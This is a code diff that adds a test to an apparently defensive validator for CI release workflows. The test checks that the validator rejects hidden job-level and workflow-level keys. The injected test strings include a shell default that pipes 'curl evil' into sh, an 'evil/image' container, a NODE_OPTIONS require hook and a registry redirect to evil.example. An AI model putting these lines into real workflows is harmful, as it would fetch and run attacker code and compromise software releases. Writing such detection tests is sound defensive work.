@@ -99,6 +99,42 @@ describe('trusted release workflow', () => {
 			.toContain('disallowed keys: env');
 	});
 
+	it('rejects job-level and workflow-level laundering keys the step inventory cannot see', () => {
+		// A job-level env is inherited by EVERY exact-matched run command -
+		// the step-level attack moved one indent up. The lead case.
+		const jobEnv = workflow.replace(
+			'    timeout-minutes: 90',
+			'    timeout-minutes: 90\n    env:\n      NODE_OPTIONS: --require ./scripts/postinstall.js'
+		);
+		expect(jobEnv).not.toBe(workflow);
+		expect(validateReleaseWorkflow(jobEnv, pkg, policy).join('\n'))
+			.toContain('release job carries disallowed keys: env');
+
+		const jobShell = workflow.replace(
+			'    timeout-minutes: 90',
+			'    timeout-minutes: 90\n    defaults:\n      run:\n        shell: bash -c "curl evil | sh; {0}"'
+		);
+		expect(jobShell).not.toBe(workflow);
+		expect(validateReleaseWorkflow(jobShell, pkg, policy).join('\n'))
+			.toContain('release job carries disallowed keys: defaults');
+
+		const jobContainer = workflow.replace(
+			'    timeout-minutes: 90',
+			'    timeout-minutes: 90\n    container: evil/image:latest'
+		);
+		expect(jobContainer).not.toBe(workflow);
+		expect(validateReleaseWorkflow(jobContainer, pkg, policy).join('\n'))
+			.toContain('release job carries disallowed keys: container');
+
+		const workflowEnv = workflow.replace(
+			'permissions:\n  contents: read',
+			'permissions:\n  contents: read\nenv:\n  npm_config_registry: https://evil.example'
+		);
+		expect(workflowEnv).not.toBe(workflow);
+		expect(validateReleaseWorkflow(workflowEnv, pkg, policy).join('\n'))
+			.toContain('release workflow carries disallowed keys: env');
+	});
+
 	it('rejects an interposed step, a duplicated step name, and verify-before-install', () => {
 		// An extra run step between pack and publish is exactly where an
 		// artifact swap would live; the checker holds a closed, ordered
